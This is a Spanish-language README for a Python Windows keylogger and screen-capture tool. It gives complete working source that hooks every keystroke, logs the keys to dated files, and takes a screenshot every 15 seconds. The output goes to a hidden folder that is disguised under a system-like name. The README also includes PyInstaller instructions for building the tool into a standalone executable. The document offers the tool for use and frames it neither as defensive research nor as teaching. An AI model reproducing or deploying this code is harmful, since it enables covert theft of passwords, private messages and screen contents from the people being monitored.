# py-keylogger-and-screenshot
Un script de keylogger desarrollado en Python para la plataforma Windows, que no solo registra las pulsaciones de teclas, sino que también captura automáticamente la pantalla cada 15 segundos.

### Comandos de Compilacion

Con pyinstaller generar el `.spec` y agregar todas las dependencias al `.spec`

keylogger.spec
```.spec
    hiddenimports=['keyboard', 'sys', 'os', 'time', 'ctypes', 'datetime', 'threading', 'pyautogui', 'Pillow'],
```
Agregar al hide import las librerias y luego compilarlo desde el `.spec`
```pyinstaller
pyinstaller .\keylogger.spec
```

```python
import os
import sys
import time
import ctypes
import threading
import pyautogui
from datetime import datetime
import keyboard


class SistemaArchivos:
    def __init__(self, nombre_programa: str) -> None:
        # Crear la ruta para la carpeta del programa en Local AppData
        self.program_path = os.path.join(
            os.environ['LOCALAPPDATA'], nombre_programa)

        # Crear la carpeta del programa si no existe
        os.makedirs(self.program_path, exist_ok=True)
        # Ocultar la carpeta
        ctypes.windll.kernel32.SetFileAttributesW(self.program_path, 0x02)

        # Rutas para los logs de teclas y las imágenes
        self.key_logs_path = os.path.join(self.program_path, "KEY_LOGS")
        self.pics_logs_path = os.path.join(self.program_path, "PICS_LOGS")

        # Crear subcarpetas si no existen
        os.makedirs(self.key_logs_path, exist_ok=True)
        os.makedirs(self.pics_logs_path, exist_ok=True)

    def guardar(self, contenido: str):
        # Obtener la fecha y hora actuales
        fecha = datetime.now().strftime("%d-%m-%Y")
        hora = datetime.now().strftime("%H:%M")

        # Crear el path del archivo
        path_archivo = os.path.join(self.key_logs_path, f"{fecha}.txt")

        # Abrir o crear el nuevo archivo en modo append
        with open(path_archivo, 'a') as archivo:
            contenido_formateado = f"[{hora}] {contenido}\n"
            archivo.write(contenido_formateado)

    def screenshot(self, stop_event):
        fecha = datetime.now().strftime("%d-%m-%Y")
        contador = 0
        while not stop_event.is_set():
            # Capturar la pantalla y guardar la imagen
            screenshot = pyautogui.screenshot()
            screenshot.save(os.path.join(self.pics_logs_path, f"{fecha}_{contador}.png"))
            contador += 1
            time.sleep(15)


class Control:
    def __init__(self, sistema_archivos: SistemaArchivos) -> None:
        self.LOG = ""
        self.sistema_archivos = sistema_archivos

        # Hook del teclado
        keyboard.hook(self.pulsaciones)

    def pulsaciones(self, pulsacion):
        if pulsacion.event_type == keyboard.KEY_DOWN:
            tecla = pulsacion.name

            # Lista de teclas especiales
            teclas_especiales = [
                'space', 'shift', 'right shift', 'esc', 'tab', 'enter', 'alt',
                'right alt', 'right ctrl', 'num lock', 'caps lock',
                'left windows', 'right windows', 'backspace', 'insert',
                'delete', 'home', 'end', 'page up', 'page down',
                'left', 'up', 'right', 'down', 'f1', 'f2', 'f3',
                'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
            ]

            # Guardar tecla presionada
            if tecla in teclas_especiales:
                self.guardar_log(f"[{tecla}]")
            else:
                self.guardar_log(tecla)

    def guardar_log(self, tecla):
        # Acumular las teclas presionadas
        self.LOG += tecla

        # Guardar el log si se presiona Enter o si alcanza 75 caracteres
        if tecla == "[enter]":
            if self.LOG.strip():  # Asegurarse de que no esté vacío
                self.sistema_archivos.guardar(self.LOG.strip())
            self.LOG = ""  # Reiniciar el log después de guardarlo
        elif len(self.LOG) >= 75:
            self.sistema_archivos.guardar(self.LOG)
            self.LOG = ""  # Reiniciar el log después de guardarlo

    def ejecutar(self, stop_event):
        try:
            # Mantener el programa en ejecución
            while not stop_event.is_set():
                time.sleep(100)  # Esperar 100 segundos
        except KeyboardInterrupt:
            sys.exit()


def IniciarKeylogger():
    sistema_archivos = SistemaArchivos("Windows Logs")
    control = Control(sistema_archivos)

    # Event flag para controlar la detención de los hilos
    stop_event = threading.Event()

    # Crear hilos para el keylogger y la captura de pantalla
    HiloKeyBoard = threading.Thread(target=control.ejecutar, args=(stop_event,))
    HiloScreeShot = threading.Thread(target=control.sistema_archivos.screenshot, args=(stop_event,))

    # Iniciar los hilos
    HiloKeyBoard.start()
    HiloScreeShot.start()

    try:
        while True:
            time.sleep(1)  # Mantener el programa en ejecución
    except KeyboardInterrupt:
        # Establecer el evento para detener los hilos
        stop_event.set()

    # Esperar a que los hilos terminen
    HiloKeyBoard.join()
    HiloScreeShot.join()


# Iniciar el keylogger
IniciarKeylogger()

```
